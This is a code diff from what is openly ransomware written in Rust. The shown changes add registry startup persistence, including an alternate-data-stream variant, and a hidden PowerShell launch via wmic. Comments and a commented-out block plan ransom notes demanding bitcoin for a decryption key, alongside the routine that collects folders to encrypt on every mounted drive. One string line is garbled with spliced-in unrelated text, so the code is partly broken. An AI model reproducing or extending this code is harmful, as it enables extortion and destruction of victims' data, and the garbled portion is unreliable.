@@ -27,6 +27,12 @@ use sysinfo::{NetworkExt, NetworksExt, ProcessExt, RefreshKind, System, SystemEx
 use system_changer::registry_changer;
 use walkdir::WalkDir;
 
+// powershell -command "(expand path_to_stream path_to_output) -and (.\path_to_output)"
+// leave the file where it was extracted.
+// try make the few current user registry changes in the local machine if possible
+// check notes if there are still any critical changes for stability to be done
+// afterwards move on to filling the desktop with files about how to get the data back.
+
 fn main() {
     /*
     let exec_name = match registry_changer::get_exec_name() {
@@ -49,15 +55,40 @@ fn main() {
         None => println!("No dir with home dir data!"),
     }
 
-    println!("Finished program execution!");*/
-    /*
-    fs::write(
+    println!("Finished prograchris titus tech
         "C:\\Users\\Administrator\\Desktop\\OpenMeInNotepad.rustsw",
         "In order to receive decryption key and instructions send bitcoin here: XXdfsfAHJflh39",
     );*/
+    /*
+    registry_changer::start_ransomware_on_startup_alternate_data_stream();
+
+    let command =
+        format!("wmic process call create '\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"'");
+    Command::new("cmd")
+        .args([
+            "/c",
+            "start",
+            "/min",
+            "cmd",
+            "/c",
+            "powershell",
+            "-WindowStyle",
+            "Hidden",
+            "-NonInteractive",
+            "-NoLogo",
+            "-Command",
+            &command,
+        ])
+        .spawn();*/
+
+    let use_alternate_data_stream = true;
 
     // Adds program to startup
-    registry_changer::start_ransomware_on_startup();
+    if use_alternate_data_stream {
+        registry_changer::start_ransomware_on_startup_alternate_data_stream();
+    } else {
+        registry_changer::start_ransomware_on_startup_classic();
+    }
 
     // Gets the folders to be encrypted on all the mounted drives in order of importance.
     let mut folders_to_encrypt = Vec::new();
@@ -134,8 +165,8 @@ fn main() {
     restart_explorer();
 
     // HACK keeping window opened for debugging purposes.
-    // let mut buf = String::new();
-    // std::io::stdin().read_line(&mut buf);
+    let mut buf = String::new();
+    std::io::stdin().read_line(&mut buf);
     /*
     for path in common_folder_paths {
         println!("{}", path);
